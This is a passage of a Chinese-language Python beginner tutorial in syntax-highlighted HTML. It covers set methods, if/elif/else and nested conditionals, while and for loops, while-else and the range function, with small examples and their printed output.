punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Facebook'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="计算集合元素个数"><a href="#计算集合元素个数" class="headerlink" title="计算集合元素个数"></a>计算集合元素个数</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="清空集合"><a href="#清空集合" class="headerlink" title="清空集合"></a>清空集合</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token comment"># set()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断元素是否在集合中存在"><a href="#判断元素是否在集合中存在" class="headerlink" title="判断元素是否在集合中存在"></a>判断元素是否在集合中存在</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token keyword">in</span> sthisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Runoob"</span> <span class="token keyword">in</span> thisset<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Facebook"</span> <span class="token keyword">in</span> thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''TrueFalse'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断元素 x 是否在集合 s 中，存在返回 True，不存在返回 False</p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-add.html">add()</a></td><td align="left">为集合添加元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-clear.html">clear()</a></td><td align="left">移除集合中的所有元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-copy.html">copy()</a></td><td align="left">拷贝一个集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference.html">difference()</a></td><td align="left">返回多个集合的差集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference_update.html">difference_update()</a></td><td align="left">移除集合中的元素，该元素在指定的集合也存在。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-discard.html">discard()</a></td><td align="left">删除集合中指定的元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection.html">intersection()</a></td><td align="left">返回集合的交集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection_update.html">intersection_update()</a></td><td align="left">返回集合的交集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-isdisjoint.html">isdisjoint()</a></td><td align="left">判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issubset.html">issubset()</a></td><td align="left">判断指定集合是否为该方法参数集合的子集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issuperset.html">issuperset()</a></td><td align="left">判断该方法的参数集合是否为指定集合的子集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-pop.html">pop()</a></td><td align="left">随机移除元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-remove.html">remove()</a></td><td align="left">移除指定元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference.html">symmetric_difference()</a></td><td align="left">返回两个集合中不重复的元素集合。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference_update.html">symmetric_difference_update()</a></td><td align="left">移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-union.html">union()</a></td><td align="left">返回两个集合的并集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-update.html">update()</a></td><td align="left">给集合添加元素</td></tr></tbody></table><h3 id="函数示例-4"><a href="#函数示例-4" class="headerlink" title="函数示例"></a>函数示例</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">"orange"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana', 'orange'}</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># set()</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>x <span class="token operator">=</span> fruits<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"microsoft"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>difference<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'banana'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"microsoft"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>difference_update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'banana'}</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>discard<span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>intersection<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'apple'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>  <span class="token comment"># y 集合不包含 banana 和 cherry，被移除</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>intersection_update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'apple'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"facebook"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>isdisjoint<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># True</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>issubset<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># True</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>issuperset<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># True</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'banana'}</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>symmetric_difference<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'runoob', 'banana', 'google'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>symmetric_difference_update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'runoob', 'banana', 'google'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>union<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana', 'google', 'runoob'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana', 'google', 'runoob'}</span><span class="token triple-quoted-string string">'''{'orange', 'apple', 'cherry', 'banana'}set(){'apple', 'cherry', 'banana'}{'cherry', 'banana'}{'cherry', 'banana'}{'apple', 'cherry'}{'apple'}{'apple'}TrueTrueTrue{'cherry', 'banana'}{'apple', 'cherry'}{'cherry', 'banana', 'runoob', 'google'}{'cherry', 'google', 'banana', 'runoob'}{'cherry', 'banana', 'google', 'apple', 'runoob'}{'cherry', 'banana', 'google', 'apple', 'runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> condition_1<span class="token punctuation">:</span>    statement_block_1<span class="token keyword">elif</span> condition_2<span class="token punctuation">:</span>    statement_block_2<span class="token keyword">else</span><span class="token punctuation">:</span>    statement_block_3    <span class="token triple-quoted-string string">'''如果 "condition_1" 为 True 将执行 "statement_block_1" 块语句如果 "condition_1" 为False，将判断 "condition_2"如果"condition_2" 为 True 将执行 "statement_block_2" 块语句如果 "condition_2" 为False，将执行"statement_block_3"块语句'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>python每个条件后面都要使用冒号，接着是执行语句</li><li>缩进相同的作为语句块，缩进为一个tab</li><li>python中没有switch-case语句</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">age <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入你家狗狗的年龄: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">if</span> age <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你是在逗我吧!"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> age <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"相当于 14 岁的人。"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> age <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"相当于 22 岁的人。"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> age <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>    human <span class="token operator">=</span> <span class="token number">22</span> <span class="token operator">+</span> <span class="token punctuation">(</span>age <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"对应人类年龄: "</span><span class="token punctuation">,</span> human<span class="token punctuation">)</span><span class="token comment"># 退出提示</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"点击 enter 键退出"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''请输入你家狗狗的年龄: 3对应人类年龄:  27点击 enter 键退出'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="if嵌套"><a href="#if嵌套" class="headerlink" title="if嵌套"></a>if嵌套</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> 表达式<span class="token number">1</span><span class="token punctuation">:</span>    语句    <span class="token keyword">if</span> 表达式<span class="token number">2</span><span class="token punctuation">:</span>        语句    <span class="token keyword">elif</span> 表达式<span class="token number">3</span><span class="token punctuation">:</span>        语句    <span class="token keyword">else</span><span class="token punctuation">:</span>        语句<span class="token keyword">elif</span> 表达式<span class="token number">4</span><span class="token punctuation">:</span>    语句<span class="token keyword">else</span><span class="token punctuation">:</span>    语句num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入一个数字："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入的数字可以整除 2 和 3"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入的数字可以整除 2，但不能整除 3"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入的数字可以整除 3，但不能整除 2"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入的数字不能整除 2 和 3"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''输入一个数字：4你输入的数字可以整除 2，但不能整除 3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ol><li>python中循环有for和while</li><li>缩进和冒号和条件控制相似</li></ol><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> 判断条件<span class="token punctuation">(</span>condition<span class="token punctuation">)</span>：    执行语句<span class="token punctuation">(</span>statements<span class="token punctuation">)</span>……    n <span class="token operator">=</span> <span class="token number">10</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">:</span>    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token builtin">sum</span> <span class="token operator">+</span> i    i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''55'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'随便输入，输入0退出'</span><span class="token punctuation">)</span>    var <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> var <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># break</span>                <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="while-else"><a href="#while-else" class="headerlink" title="while-else"></a>while-else</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token operator">&lt;</span>expr<span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>additional_statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&gt;</span>    count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token string">" 小于 5"</span><span class="token punctuation">)</span>   count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token string">" 大于或等于 5"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> <span class="token operator">&lt;</span>variable<span class="token operator">&gt;</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>sequence<span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statements<span class="token operator">&gt;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statements<span class="token operator">&gt;</span>    sites <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Baidu"</span><span class="token punctuation">,</span> <span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">]</span><span class="token keyword">for</span> site <span class="token keyword">in</span> sites<span class="token punctuation">:</span>    <span class="token keyword">if</span> site <span class="token operator">==</span> <span class="token string">"Runoob"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"菜鸟教程!"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"循环数据 "</span> <span class="token operator">+</span> site<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"没有循环数据!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"完成循环!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="range函数"><a href="#range函数" class="headerlink" title="range函数"></a>range函数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token 